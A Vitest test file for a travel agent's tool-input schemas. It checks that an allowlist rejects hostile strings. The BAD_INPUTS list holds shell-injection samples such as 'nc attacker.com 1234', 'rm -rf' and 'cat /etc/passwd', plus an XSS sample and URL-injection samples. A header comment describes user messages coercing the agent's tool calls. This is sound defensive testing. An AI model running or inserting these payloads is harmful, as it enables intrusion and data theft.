import {
  searchCarRentalsSchema,
  searchExperiencesSchema,
  searchFlightsSchema,
  searchHotelsSchema,
  selectCarRentalSchema,
  selectExperienceSchema,
  selectFlightSchema,
  selectHotelSchema,
} from 'app/tools/schemas.js';
import { describe, expect, it } from 'vitest';

/**
 * SEC-03 tests: tool input allowlist.
 *
 * Pre-audit, location-like string fields accepted z.string().min(1)
 * with no content restrictions, which meant a crafted user message
 * could coerce the agent into calling SerpApi / Google Places with
 * arbitrary strings. Voyager effectively became an unauthenticated
 * scraping proxy for registered users.
 *
 * The fix adds a unicode-aware allowlist to every
 * location-like field. These tests lock in the allowlist behavior.
 */

const BAD_INPUTS = [
  // Shell metachars
  'Paris; rm -rf',
  'London | nc attacker.com 1234',
  'Rome & cat /etc/passwd',
  'Berlin $(whoami)',
  'Tokyo `id`',
  // Angle brackets / HTML / XSS
  '<script>alert(1)</script>',
  'New York<img src=x>',
  // URL / query-string injection
  'Paris?q=evil',
  'London#fragment',
  'Rome/api/private',
  'Berlin=inject',
  // Whitespace attacks
  '\x00Paris',
  'Paris\n\nEvil',
  'Paris\t\t\tEvil',
  // Empty / length
  '',
  'x'.repeat(200),
];

const GOOD_INPUTS = [
  'Paris',
  'New York',
  'Los Angeles, CA',
  'Paris, France',
  'Saint-Denis',
  "Val-d'Or",
  'St. Louis',
  'Rome (FCO)',
  'Washington D.C.',
  'SFO',
  'São Paulo',
  'Zürich',
  '東京',
  'Québec City',
];

describe('searchFlightsSchema origin/destination allowlist', () => {
  const baseValid = {
    departure_date: '2026-07-01',
    passengers: 1,
  };

  for (const bad of BAD_INPUTS) {
    it(`rejects origin=${JSON.stringify(bad).slice(0, 60)}`, () => {
      const result = searchFlightsSchema.safeParse({
        ...baseValid,
        origin: bad,
        destination: 'Paris',
      });
      expect(result.success).toBe(false);
    });
  }

  for (const good of GOOD_INPUTS) {
    it(`accepts origin=${good}`, () => {
      const result = searchFlightsSchema.safeParse({
        ...baseValid,
        origin: good,
        destination: 'Paris',
      });
      expect(result.success).toBe(true);
    });
  }
});

describe('searchHotelsSchema city allowlist', () => {
  const baseValid = {
    check_in: '2026-07-01',
    check_out: '2026-07-05',
    guests: 2,
  };

  for (const bad of BAD_INPUTS) {
    it(`rejects city=${JSON.stringify(bad).slice(0, 60)}`, () => {
      const result = searchHotelsSchema.safeParse({
        ...baseValid,
        city: bad,
      });
      expect(result.success).toBe(false);
    });
  }
});

describe('searchExperiencesSchema location allowlist', () => {
  const baseValid = {
    categories: ['food'],
  };

  for (const bad of BAD_INPUTS) {
    it(`rejects location=${JSON.stringify(bad).slice(0, 60)}`, () => {
      const result = searchExperiencesSchema.safeParse({
        ...baseValid,
        location: bad,
      });
      expect(result.success).toBe(false);
    });
  }
});

describe('searchCarRentalsSchema pickup_location allowlist', () => {
  const baseValid = {
    pickup_date: '2026-07-01',
    dropoff_date: '2026-07-05',
  };

  for (const bad of BAD_INPUTS) {
    it(`rejects pickup_location=${JSON.stringify(bad).slice(0, 60)}`, () => {
      const result = searchCarRentalsSchema.safeParse({
        ...baseValid,
        pickup_location: bad,
      });
      expect(result.success).toBe(false);
    });
  }
});

describe('selectFlightSchema origin/destination allowlist', () => {
  const baseValid = {
    airline: 'Delta',
    flight_number: 'DL100',
    price: 450,
    currency: 'USD',
  };

  for (const bad of BAD_INPUTS) {
    it(`rejects origin=${JSON.stringify(bad).slice(0, 60)}`, () => {
      const result = selectFlightSchema.safeParse({
        ...baseValid,
        origin: bad,
        destination: 'Paris',
      });
      expect(result.success).toBe(false);
    });

    it(`rejects destination=${JSON.stringify(bad).slice(0, 60)}`, () => {
      const result = selectFlightSchema.safeParse({
        ...baseValid,
        origin: 'JFK',
        destination: bad,
      });
      expect(result.success).toBe(false);
    });
  }

  for (const good of GOOD_INPUTS) {
    it(`accepts origin=${good}`, () => {
      const result = selectFlightSchema.safeParse({
        ...baseValid,
        origin: good,
        destination: 'Paris',
      });
      expect(result.success).toBe(true);
    });
  }
});

describe('selectHotelSchema city allowlist', () => {
  const baseValid = {
    name: 'Hotel Arts',
    price_per_night: 200,
    total_price: 1000,
    currency: 'USD',
  };

  for (const bad of BAD_INPUTS) {
    it(`rejects city=${JSON.stringify(bad).slice(0, 60)}`, () => {
      const result = selectHotelSchema.safeParse({
        ...baseValid,
        city: bad,
      });
      // Empty string gets rejected by min(1); other bad inputs rejected by regex
      expect(result.success).toBe(false);
    });
  }

  it('accepts valid city', () => {
    const result = selectHotelSchema.safeParse({
      ...baseValid,
      city: 'Barcelona',
    });
    expect(result.success).toBe(true);
  });

  it('accepts omitted city (optional)', () => {
    const result = selectHotelSchema.safeParse(baseValid);
    expect(result.success).toBe(true);
  });
});

describe('searchExperiencesSchema categories[] allowlist', () => {
  const baseValid = { location: 'Paris', categories: ['food'] };

  for (const bad of BAD_INPUTS) {
    it(`rejects categories=[${JSON.stringify(bad).slice(0, 40)}]`, () => {
      const result = searchExperiencesSchema.safeParse({
        ...baseValid,
        categories: [bad],
      });
      expect(result.success).toBe(false);
    });
  }

  for (const good of GOOD_INPUTS) {
    it(`accepts categories=[${good}]`, () => {
      const result = searchExperiencesSchema.safeParse({
        ...baseValid,
        categories: [good],
      });
      expect(result.success).toBe(true);
    });
  }
});

describe('selectFlightSchema airline/flight_number allowlist', () => {
  const baseValid = {
    origin: 'JFK',
    destination: 'Paris',
    price: 450,
    currency: 'USD',
  };

  for (const bad of BAD_INPUTS) {
    it(`rejects airline=${JSON.stringify(bad).slice(0, 40)}`, () => {
      const result = selectFlightSchema.safeParse({
        ...baseValid,
        airline: bad,
        flight_number: 'DL100',
      });
      expect(result.success).toBe(false);
    });

    it(`rejects flight_number=${JSON.stringify(bad).slice(0, 40)}`, () => {
      const result = selectFlightSchema.safeParse({
        ...baseValid,
        airline: 'Delta',
        flight_number: bad,
      });
      expect(result.success).toBe(false);
    });
  }
});

describe('selectHotelSchema name allowlist', () => {
  const baseValid = {
    price_per_night: 200,
    total_price: 1000,
    currency: 'USD',
  };

  for (const bad of BAD_INPUTS) {
    it(`rejects name=${JSON.stringify(bad).slice(0, 40)}`, () => {
      const result = selectHotelSchema.safeParse({
        ...baseValid,
        name: bad,
      });
      expect(result.success).toBe(false);
    });
  }
});

describe('selectCarRentalSchema provider/car_name allowlist', () => {
  const baseValid = { total_price: 300, currency: 'USD' };

  for (const bad of BAD_INPUTS) {
    it(`rejects provider=${JSON.stringify(bad).slice(0, 40)}`, () => {
      const result = selectCarRentalSchema.safeParse({
        ...baseValid,
        provider: bad,
        car_name: 'Toyota Camry',
      });
      expect(result.success).toBe(false);
    });

    it(`rejects car_name=${JSON.stringify(bad).slice(0, 40)}`, () => {
      const result = selectCarRentalSchema.safeParse({
        ...baseValid,
        provider: 'Hertz',
        car_name: bad,
      });
      expect(result.success).toBe(false);
    });
  }
});

describe('selectExperienceSchema name allowlist', () => {
  const baseValid = { estimated_cost: 30 };

  for (const bad of BAD_INPUTS) {
    it(`rejects name=${JSON.stringify(bad).slice(0, 40)}`, () => {
      const result = selectExperienceSchema.safeParse({
        ...baseValid,
        name: bad,
      });
      expect(result.success).toBe(false);
    });
  }
});
